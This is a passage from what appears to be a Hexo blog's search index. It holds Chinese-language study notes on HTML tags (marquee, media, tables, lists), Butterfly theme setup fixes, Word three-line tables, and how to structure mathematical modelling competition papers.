class="string">&quot;up&quot;</span>&gt;</span>上走马<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">marquee</span> <span class="attr">behavior</span>=<span class="string">&quot;&quot;</span> <span class="attr">direction</span>=<span class="string">&quot;down&quot;</span>&gt;</span>下走马<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">marquee</span> <span class="attr">behavior</span>=<span class="string">&quot;&quot;</span> <span class="attr">direction</span>=<span class="string">&quot;right&quot;</span>&gt;</span>右走马<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>scrollamout用于设置滚动速度，默认为1，值越大，速度越快，5-10适合观看<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">marquee</span> <span class="attr">behavior</span>=<span class="string">&quot;&quot;</span> <span class="attr">direction</span>=<span class="string">&quot;&quot;</span> <span class="attr">scrollamount</span>=<span class="string">&quot;10&quot;</span>&gt;</span>我是速度为5的走马灯<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span>\</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>设置滚动范围控制 width height; 滚动背景颜色 bgcolor<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">marquee</span> <span class="attr">direction</span>=<span class="string">&quot;up&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">bgcolor</span>=<span class="string">&quot;deeppin&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>使用很简单，就是简单的属性堆叠，很多属性一查便知，在此只简单放一个实例</p></blockquote><h2 id="四、视频音频"><a href="#四、视频音频" class="headerlink" title="四、视频音频"></a>四、视频音频</h2><p>- </p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>多媒体标签演示<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- 音频标签 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;./multimedia/mp3/bike.mp3&quot;</span> <span class="attr">controls</span>=<span class="string">&quot;controls&quot;</span> <span class="attr">autoplay</span>=<span class="string">&quot;autoplay&quot;</span> <span class="attr">loop</span>=<span class="string">&quot;loop&quot;</span>&gt;</span></span><br><span class="line">       你的浏览器不支持这种音乐格式。</span><br><span class="line">   <span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- 视频标签 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">h2</span>&gt;</span>视频标签<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;./multimedia/mp4/goodbye.mp4&quot;</span> <span class="attr">controls</span>=<span class="string">&quot;controls&quot;</span> <span class="attr">autoplay</span> <span class="attr">poster</span>=<span class="string">&quot;./img/animal.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;80%&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">track</span> <span class="attr">kind</span>=<span class="string">&quot;subtitles&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./multimedia/mp4/test.vtt&quot;</span> <span class="attr">srclang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">label</span>=<span class="string">&quot;English&quot;</span>&gt;</span></span><br><span class="line">       抱歉你的视频不支持嵌入字幕</span><br><span class="line">   <span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure><blockquote><p>视频播放、音频播放的使用很简单，就是简单的属性堆叠，很多属性一查便知，在此只简单放一个实例</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 技术栈学习 </category>
          
          <category> web应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html 表单 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>表格制作</title>
      <link href="/2023/09/18/%E8%A1%A8%E6%A0%BC%E5%88%B6%E4%BD%9C/"/>
      <url>/2023/09/18/%E8%A1%A8%E6%A0%BC%E5%88%B6%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="一、常规三线表"><a href="#一、常规三线表" class="headerlink" title="一、常规三线表"></a>一、常规三线表</h2><p><img src="/2023/09/18/%E8%A1%A8%E6%A0%BC%E5%88%B6%E4%BD%9C/image-20230907135410944.png" alt="image-20230907135410944"></p><ul><li>字体：新罗马</li></ul><h2 id="二、特殊三线表"><a href="#二、特殊三线表" class="headerlink" title="二、特殊三线表"></a>二、特殊三线表</h2><h3 id="1-长表"><a href="#1-长表" class="headerlink" title="1. 长表"></a>1. 长表</h3><ul><li>excel中对半分割，粘贴到word中</li><li>设置三线表，中间插入</li></ul><h3 id="2-宽表"><a href="#2-宽表" class="headerlink" title="2.宽表"></a>2.宽表</h3><ul><li>分成几组，“续表”连接表格</li><li>布局——&gt;水平居中 针对文字</li></ul><h3 id="3-有单元格列表的表格"><a href="#3-有单元格列表的表格" class="headerlink" title="3. 有单元格列表的表格"></a>3. 有单元格列表的表格</h3><ul><li>白色断点——白色边框</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学建模 论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html基础知识</title>
      <link href="/2023/09/18/html%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/09/18/html%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h2 id="一、html基本结构"><a href="#一、html基本结构" class="headerlink" title="一、html基本结构"></a>一、html基本结构</h2><ul><li><p>start task</p></li><li><p>content</p></li><li><p>end task</p></li><li><p>文档结构</p><p>- </p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">这里的内容无法显示在网页上</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">显示在网页中的部分</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  头部信息：</p><p>  <img src="/2023/09/18/html%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230913212111951.png" alt="image-20230913212111951"></p><ul><li>link：导入css</li><li>meta两种形式：<ul><li><img src="/2023/09/18/html%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230913212137840.png" alt="image-20230913212137840"></li></ul></li></ul></li></ul><h2 id="二、结构标签"><a href="#二、结构标签" class="headerlink" title="二、结构标签"></a>二、结构标签</h2><ul><li><p>命名实体——&amp;xxx</p><ul><li>空格换行，只认一个——命名实体</li></ul></li><li><p>img标签</p><p>- </p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;图片地址（本地/网页）&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;替代，图片无效给出文本提示&quot;</span> <span class="attr">height</span>= <span class="string">&quot;&quot;</span> <span class="attr">width</span>=<span class="string">&quot;pix/50%&quot;</span> <span class="attr">title</span>=<span class="string">&quot;补充性说明&quot;</span></span></span><br></pre></td></tr></table></figure></li><li><p>&lt;a标签</p><p>- </p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">herf</span> =<span class="string">&quot;完整url&quot;</span> <span class="attr">target</span>=<span class="string">&quot;self(本窗口)/blank（新窗口）&quot;</span> #<span class="attr">超链接作用</span></span></span><br><span class="line"><span class="tag">&lt;<span class="attr">a</span> <span class="attr">herf</span> =<span class="string">&quot;#id&quot;</span> <span class="attr">target</span>=<span class="string">&quot;self(本窗口)/blank（新窗口）&quot;</span> #<span class="attr">锚id</span></span></span><br><span class="line"><span class="tag"><span class="attr">id属性</span>：<span class="attr">id----唯一标识</span>，<span class="attr">能让锚自动连接到</span></span></span><br></pre></td></tr></table></figure></li><li><p>&lt;table标签</p><p>- </p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">caption</span>&gt;</span>表头</span><br><span class="line"><span class="tag">&lt;<span class="name">thead</span>&gt;</span>标题栏</span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span>#一行</span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>#标题值</span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tbody</span>&gt;</span>#表体</span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span>#一行</span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>/<span class="attr">colspan</span>(<span class="attr">横跨</span> <span class="attr">纵跨</span>)&gt;</span>#data</span><br></pre></td></tr></table></figure></li><li><ol <p>- <p></p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span> &quot;(<span class="attr">1</span>/<span class="attr">A</span>/<span class="attr">I</span>)&quot; <span class="attr">start</span> &quot;(<span class="attr">从哪一个标号开始</span>)&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>xxx</span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>XXX</span><br><span class="line">&lt;\ol&gt;</span><br><span class="line">#order list</span><br></pre></td></tr></table></figure></ol></li><li><p>&lt;ul———做表单</p><p>- </p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">type</span> &quot;(<span class="attr">1</span>/<span class="attr">A</span>/<span class="attr">I</span>)&quot; <span class="attr">start</span> &quot;(<span class="attr">从哪一个标号开始</span>)&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>xxx</span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>XXX</span><br><span class="line">&lt;\ul&gt;</span><br><span class="line">#unorder list</span><br></pre></td></tr></table></figure></li><li><p>&lt;dl——自定义列表</p><ul><li><p>​</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>#dt的子列表</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术栈学习 </category>
          
          <category> web应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html 基本标签 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>butterfly主题配置踩坑</title>
      <link href="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/"/>
      <url>/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原始的hexo博客界面比较简单，在查阅了很多资料以后，选择了butterfly主题，应为他的参考文档非常全面，并且配置人数也比较多，解决bug的概率也较大，本篇博客记录于butterfly主题配置完成时，后续将对现有主题经行魔改。</p></blockquote><h1 id="一、主题展示"><a href="#一、主题展示" class="headerlink" title="一、主题展示"></a>一、主题展示</h1><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915102936524.png" alt="image-20230915102936524"></p><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915103117025.png" alt="image-20230915103117025"></p><h2 id="二、踩坑记录"><a href="#二、踩坑记录" class="headerlink" title="二、踩坑记录"></a>二、踩坑记录</h2><p>在本次主题更改上，由于参考了很多文档，下载了很多插件，修改了很多配置，造成后续问题排除较为困难，小博在配置过程中遇到了一些网上几乎没有解决方法的问题，在下面予以记录。</p><ol><li>图片路径问题</li></ol><p>hexo博客能够将md文档渲染成html在web上显示，但是图片的插入是需要手动配置的，尝试很多博主的教程以后找到了一种可行的解决方式：</p><ul><li><p>修改tpyro的图片路径相关设置：</p></li><li><p>安装插件，将md文档中的相对路径转换为html中的绝对路径</p></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915104437952.png" alt="image-20230915104437952"></p><p>  转换后的路径显示：</p><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915104506178.png" alt="image-20230915104506178"></p><blockquote><p>这里由于我设置的post名称为中文，所以转化成了url编码（这是自动的，网上看见说中文title无法正常显示图片，但是我实测下来是没问题的），即可以在bash中运行 <code>hexo new 中文标题</code></p></blockquote><ol start="2"><li>代码块显示问题</li></ol><p>代码块的显示坑了我好久——这里建议，在才开始搭建的时候就按照butterfly的官方说明文档安装，不要网上各种搜罗搭建博客，我就是在搭建过程中不知道什么时候安装了第三方插件用于代码显示，造成了后续博客渲染除了问题，而且没有任何报错，排除问题很麻烦。</p><ul><li><p>修改highlight显示，但是无效，</p><ul><li>前端渲染如下：</li></ul><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915105230219.png" alt="image-20230915105230219"></p><ul><li>原始md文档如下：</li></ul><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915105455077.png" alt="image-20230915105455077"></p><ul><li>在主题配置中，我修改了<code>highlight</code>中的配置如下：</li></ul></li></ul><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915105621030.png" alt="image-20230915105621030"></p><pre><code>  可以发现，几乎所有的配置都没有生效，反而格式混乱，经过各种尝试并且又仔细阅读了官方文档：</code></pre><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915105835747.png" alt="image-20230915105835747"></p><p>于是我想到可能我可能安装了第三方插件，导致格式混论，于是在网上找到一个教程，说可能下载了插件<code>“hexo-prism-plugin</code>”，于是按照教程卸载：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-prism-plugin</span><br></pre></td></tr></table></figure><p>再次修改原生配置文件中的字段：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">highlight:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  line_number: <span class="literal">false</span></span><br><span class="line">  auto_detect: <span class="literal">false</span></span><br><span class="line">  tab_replace: <span class="string">&#x27;&#x27;</span></span><br><span class="line">  wrap: <span class="literal">true</span></span><br><span class="line">  hljs: <span class="literal">false</span></span><br><span class="line">prismjs:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">false</span></span><br><span class="line">  preprocess: <span class="literal">true</span></span><br><span class="line">  line_number: <span class="literal">true</span></span><br><span class="line">  tab_replace: <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后代码块样式成功显示：</p><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915110438643.png" alt="image-20230915110438643"></p><ol start="2"><li><p>但是如上，代码格式并没有正常显示，这个问题比较刁钻，因为这可能是原生hexo解释typro的时候潜存的一个问题：</p><p>在列表后插入代码块一定要换行！！！</p><p>如果不换行就是上面的效果。</p><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915110808565.png" alt="image-20230915110808565"></p></li></ol><h2 id="三、最终效果"><a href="#三、最终效果" class="headerlink" title="三、最终效果"></a>三、最终效果</h2><p>在排除完这一系列问题后，博文终于正常显示：</p><p><img src="/2023/09/18/butterfly%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/image-20230915111111307.png" alt="image-20230915111111307"></p><p>接下来就是精心设计一下自己的博客啦，前期的很多图片都是网上随意找的，侧边栏等也还没有更改，后续慢慢更新！</p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 主题更改配置 butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数模论文写作</title>
      <link href="/2023/09/18/%E6%95%B0%E6%A8%A1%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C/"/>
      <url>/2023/09/18/%E6%95%B0%E6%A8%A1%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<blockquote><p>针对论文写作的初步探究，数模论文突击，根据视频做简要笔记。</p></blockquote><h2 id="一、标题"><a href="#一、标题" class="headerlink" title="一、标题"></a>一、标题</h2><ul><li>基于xxx方法的xxx（问题）模型</li></ul><h2 id="二、摘要"><a href="#二、摘要" class="headerlink" title="二、摘要"></a>二、摘要</h2><ul><li><p>最后写</p></li><li><p>篇幅：首页3&#x2F;4（1000）</p></li><li><p>写作技巧：</p><ul><li><p>开头：3-5行</p><ul><li>简单交代论文背景，题目研究什么</li><li>我们是怎么做的，提取关键词，用到的关键模型，方法，或者关键的逻辑。【重要】</li></ul></li><li><p>中间：</p><ul><li>模式：针对问题一、二、三</li><li>每一点如何书写：<ul><li>梳理清楚每个问题之间的关联【是并行的，还是有层次的】来决定我们的论文该如何在优秀论文的框架下进行变动，确定最后的层次</li><li>在每个问题下，要说清楚<strong>我们</strong>研究的问题【为了得到最终结果，我们应该要求的变量关系或者值&#x2F;值的范围】，我们是利用什么方法研究的，最后得到了什么结果。&#x3D;&#x3D;有数值计算一定要明确写出，如果结果过于庞杂，要给出明确结果引导【在xxx有完整结果】&#x3D;&#x3D;</li><li>注意：在阐述模型时，要解释清楚模型的<strong>关键参数含义</strong>。</li><li>总结：有问题，就要有方法，就要有结果。不管是根据题目的现有问题，还是自己提炼出的问题，都是这样。语句之间要有逻辑性。</li></ul></li></ul></li><li><p>结尾：介绍亮点（如果有），说一下推广性（如果想的出来）。</p><ul><li>要客观，站在别人的角度第一次读，要给人以说服性。</li></ul></li><li><p>废话提升</p><ul><li><p>紧密结合题目本身。</p><ul><li>eg：此模型较优–&gt;哪里优了–&gt;【<strong>有对比</strong>】【<strong>有数据</strong>】</li></ul></li></ul></li></ul></li></ul><h2 id="三、关键词"><a href="#三、关键词" class="headerlink" title="三、关键词"></a>三、关键词</h2><ul><li>个数：4-6</li><li>模型，问题</li></ul><h2 id="四、问题重述"><a href="#四、问题重述" class="headerlink" title="四、问题重述"></a>四、问题重述</h2><ul><li>目的：为了防止查重</li><li>篇幅：不超过1页</li><li>方式：从题目中总结出问题的<ul><li>背景</li><li>每个问题的进一步说明，包含一些模糊的方式方法</li></ul></li></ul><h2 id="五、问题分析"><a href="#五、问题分析" class="headerlink" title="五、问题分析"></a>五、问题分析</h2><ul><li>篇幅：不超过1页，最多不超过2页</li><li>作用：承上启下，承接问题，启发模型建立</li><li>写作模式：针对每个问题单独有一段，小标题隔开</li><li>位置：重述之后。</li><li>必要——流程图&#x2F;思维导图【每一题一个，或者要是思考得能够更加深入，就总体画一个】</li></ul><h2 id="六、模型假设"><a href="#六、模型假设" class="headerlink" title="六、模型假设"></a>六、模型假设</h2><ul><li><p>目的：简化模型</p></li><li><p>类型：</p><ul><li>题目明确给出</li><li>排除生活小概率事件</li><li>核心因素，不可过于简化</li><li>使用的模型中本身有的假设</li><li>对模型中的参数形式（或分布）假设【有验证，比如假设泊松分布，要说，图形化出来钟形】</li><li>深入挖掘模型后为了简化模型的假设【实践以后】</li></ul></li><li><p>合理性说服：【少，能就说】</p><ul><li>引用别人的资料</li><li>数据、绘图支撑</li><li>假设检验</li></ul></li><li><p>模型评价与改进——弥补 <strong>太过简化</strong> 的问题</p></li></ul><h2 id="七、符号说明"><a href="#七、符号说明" class="headerlink" title="七、符号说明"></a>七、符号说明</h2><ul><li>形式：三线表</li><li>包含：<ul><li>重要符号，一些临时的变量可以忽略，</li><li>含义解释</li><li>单位（可以不写）</li></ul></li></ul><h2 id="八、模型建立与求解"><a href="#八、模型建立与求解" class="headerlink" title="八、模型建立与求解"></a>八、模型建立与求解</h2><ul><li><p>模型选择</p><ul><li>简洁，实用</li></ul></li><li><p>写作模式：</p><ul><li>大点：问题x的模型建立与求解，【根据实际情况选择以下两种架构中的一个】</li></ul><p><img src="/2023/09/18/%E6%95%B0%E6%A8%A1%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C/image-20230915083737851-16947382658551.png" alt="image-20230915083737851"></p><p>​                               1.  适合小标题层数较少的情况</p><p>​                               2.  适合小标题层数较多的情况【会更加简洁】</p><ul><li><p>小点：主要层次为：</p><ol><li>模型的建立</li></ol><ul><li><p><strong>统计分析</strong>为主，无需建模【第一问，规律，统计性分析】</p><ul><li>&#x3D;&#x3D;亮点&#x3D;&#x3D;：数据检查处理<ul><li>异常值</li><li>插值</li><li>无量纲处理</li><li>统计分析软件、统计量阐释【方差..】</li><li>漂亮的图</li></ul></li></ul></li><li><p>使用已有模型建立求解</p><ul><li><p><strong>评价类</strong></p><blockquote><p>数据或条件，建立客观的指标体系</p></blockquote><ul><li><p>主观评价【无数据支撑】</p><ul><li>层次分析</li><li>模糊综合评价</li><li>综合指数法</li></ul></li><li><p>客观评价 【有数据支撑】    </p><ul><li>主成分分析</li><li>因子分析</li><li>Topsisi评价</li><li>神经网络分析</li></ul><p>步骤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.明确评价目的建立指标体系</span><br><span class="line">有代表性，确定性【可量化】，独立性，区别能力</span><br><span class="line">2.指标体系规范化处理，一致化、无量纲化</span><br><span class="line">无量纲化：归一化，标准差，极值差法，功效系数</span><br><span class="line">3.确定指标体系对应的权重系数</span><br><span class="line">主管定权，客观定权</span><br><span class="line">4.选择或构造综合评价模型</span><br><span class="line">线性加权：各个指标保持独立</span><br><span class="line">非线性加权：不具有独立型</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>预测类</strong></p><blockquote><p>预测事物的一些未知属性或已知属性未来的趋势</p></blockquote><ul><li><p>中短期预测：【10-50年】</p><ul><li>回归分析</li><li>时间序列预测</li><li>微分方程预测</li></ul></li><li><p>长期预测【100年】</p><ul><li>神经网络</li><li>Logistic</li><li>微分方程</li></ul><p>步骤：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.原始数据预处理</span><br><span class="line">残缺之补全、异常值剔除等</span><br><span class="line">2.根据条件选择/建立合适的模型</span><br><span class="line">中短期、长期、大样本/小样本</span><br><span class="line">3.对模型预测结果进行误差分析</span><br><span class="line">绝对误差分析、相对误差分析等</span><br><span class="line">一般相对误差——一级0.01，二级0.05【中短期】</span><br><span class="line">——三级0.5【长期】</span><br><span class="line">4.给出最终的预测结果，回答问题</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>优化类</strong>：</p><blockquote><p>条件固定，取最优</p></blockquote><ul><li><p>根据目标函数及约束函数类型分类</p><ul><li>线性规划</li><li>非线性规划</li><li>二次规划</li></ul></li><li><p>根据决策变量的类型分类</p><ul><li>整数规划</li><li>混合整数</li><li>0-1规划</li></ul></li><li><p>其他</p><ul><li>单目标规划</li><li>动态规划与静态规划</li><li>随机规划与确定规划</li></ul><p>步骤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">三因素：</span><br><span class="line">目标函数</span><br><span class="line">决策变量【自变量】</span><br><span class="line">约束条件</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/09/18/%E6%95%B0%E6%A8%A1%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C/Screenshot_20230906_101030_tv.danmaku.bili_edit_8.jpg" alt="Screenshot_20230906_101030_tv.danmaku.bili_edit_8"></p></li></ul></li></ul></li><li><p>结合已有模型，或者优化&#x2F;改进模型【针对优化改进的部分详细说明】</p><ul><li><p>出发点：</p><ul><li>原有模型存在一定固有缺陷</li><li>原有模型对现有模型不太实用</li><li>原模型太简单，考虑的内容太少</li></ul></li><li><p>注意点：</p><ul><li>为什么改进</li><li>如何改进<ul><li>伪代码【档次】【三线】</li><li>流程图</li></ul></li><li>前后对比【模型复杂度，准确度，时效性，可操作性…】</li></ul></li><li><p>常见的集成：</p><ul><li><p>评价类，定权更加准确</p><ul><li><strong>基于层次分析-熵权法的综合评价模型</strong></li></ul></li><li><p>预测类，小样本预测</p><ul><li><strong>基于灰色—-bp神经网络综合预测模型</strong><ul><li>灰色：数据量少，误差大</li><li>神经：数据量大，防过拟合</li><li>灰色预测未来结果 带入到神经网络，作为输入，真实作为输出、神经网络自动拟合二者差值作为误差。</li></ul></li></ul></li><li><p>评价类、预测类均可用，精度更高</p><ul><li><strong>基于遗传算法的BP伸进网络优化算法</strong><ul><li>BP：初值和阈值随机，容易陷入局部最小值</li><li>遗传算法：把初值和阈值设定得更加精确</li></ul></li></ul></li><li><p>预测类，大样本：</p><ul><li><p><strong>基于小波变换——神经网络的预测模型</strong></p><ul><li>传统神经网络的隐含层——s&#x2F;t—&gt;小波的基函数</li></ul></li></ul></li></ul></li></ul></li><li><p>模型的求解</p><ul><li>物理数学：<ul><li>务必具体的结果 单位</li></ul></li><li>评价&#x2F;预测类型<ul><li>需要结合图标&#x3D;表表现，注意格式，美观</li></ul></li><li>解释原因，给出建议等开放类赛题<ul><li>分条作答（4最多）</li></ul></li></ul></li></ul></li></ul></li></ul><h2 id="九、模型检验"><a href="#九、模型检验" class="headerlink" title="九、模型检验"></a>九、模型检验</h2><ul><li><p><strong>稳定性和敏感性分析</strong>【重点】</p><ul><li>使用场景：模型中某些参数固定，【查的资料.题目固定..】</li><li>目的：检验模型中某参数变化是否引起模型输出产生变化</li><li>稳定性：独立的参数<code>y=ax+b</code>中的<code>b</code>       <ul><li>b上下浮动%5，画出曲线，观察平整度</li></ul></li><li>敏感性：作用在变量上的参数</li><li>y-x图：与时间有关，时间横坐标</li><li>b-y图：与时间无关，只为得总体数值</li></ul></li><li><p>统计检验与误差分析</p><ul><li>统计检验——&#x3D;&#x3D;回归分析&#x3D;&#x3D;<ul><li>统计检验——假设检验</li><li>级比检验——灰色模型</li><li>一般包括t&#x2F;f</li><li>主要写在 <strong>建模过程</strong></li></ul></li><li>误差分析——预测类<ul><li><strong>建模过程</strong>：真实值和预测值的误差——&lt;0.1，计算说明</li><li><strong>末尾</strong>：无真实数据，分析目标来源，简单说明。</li></ul></li></ul></li><li><p>新旧模型对比——改进模型：</p><ul><li>结果精度</li><li>模型复杂度</li><li>模型运行效率【神经网络】</li><li>模型可推广性</li></ul></li></ul><h2 id="十、模型优缺点"><a href="#十、模型优缺点" class="headerlink" title="十、模型优缺点"></a>十、模型优缺点</h2><ul><li>优点多写</li><li>不局限于模型，包括建模过程</li><li>优点表述：（4-6）<ul><li>简洁实用，高效</li><li>创新【少】</li><li>准确</li><li>考虑全面</li><li>进行各类检验，稳定性高</li><li>模型本身的优缺点</li></ul></li><li>缺点表述：（2-4）<ul><li>受xx因素限制，未考虑xxx，影响精度</li><li>理想，降低模型普适性</li><li>考虑了xx因素，计算时间长，复杂</li><li>模型本身的缺点</li></ul></li></ul><h2 id="十一、参考文献"><a href="#十一、参考文献" class="headerlink" title="十一、参考文献"></a>十一、参考文献</h2><h2 id="十二、附录"><a href="#十二、附录" class="headerlink" title="十二、附录"></a>十二、附录</h2><ul><li>包括支撑材料的文件列表、所有源代码【模型求解】</li><li>不便展开的结果</li><li>前面的表不便全部展开的，放在附录</li><li>另起一页</li></ul><h2 id="十三、支撑材料"><a href="#十三、支撑材料" class="headerlink" title="十三、支撑材料"></a>十三、支撑材料</h2><ul><li>所有源程序以及调用说明</li><li>除题目所给数据以外的数据</li><li>较大篇幅的中间结果，图形，表格</li><li>公开渠道找到的相关资料</li></ul><h2 id="十四、特别注意"><a href="#十四、特别注意" class="headerlink" 